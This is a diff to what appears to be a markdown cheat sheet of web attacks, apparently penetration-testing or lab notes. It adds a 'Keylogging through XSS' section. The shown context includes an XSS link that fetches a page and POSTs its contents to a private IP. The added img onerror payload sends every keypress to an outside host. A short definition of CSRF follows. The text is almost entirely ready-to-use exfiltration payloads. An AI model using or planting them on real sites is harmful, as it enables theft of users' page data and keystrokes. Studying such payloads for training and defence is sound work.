@@ -159,6 +159,12 @@ Please note that the cookie is a Base64 value because we used the `btoa()` funct
 ```javascript
 <a href="javascript:fetch('http://localhost:3000/',{mode:'no-cors'}).then(response=>response.text()).then(data => fetch('http://10.10.16.32:8000/data',{method: 'POST', mode:'no-cors',body: JSON.stringify({data: data})}))">Click Me</a>
 ```
+
+## Keylogging through XSS
+
+```js
+<img src=x onerror='document.onkeypress=function(e){fetch("http://10.10.16.3?k="+String.fromCharCode(e.which))},this.remove();'>
+```
 # Cross-Site Request Forgery
 
 Cross-Site Request Forgery (CSRF or XSRF) is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated. This attack is usually mounted with the help of attacker-crafted web pages that the victim must visit or interact with, leveraging the lack of anti-CSRF security mechanisms. These web pages contain malicious requests that essentially inherit the identity and privileges of the victim to perform an undesired function on the victim's behalf. CSRF attacks generally target functions that cause a state change on the server but can also be used to access sensitive data.
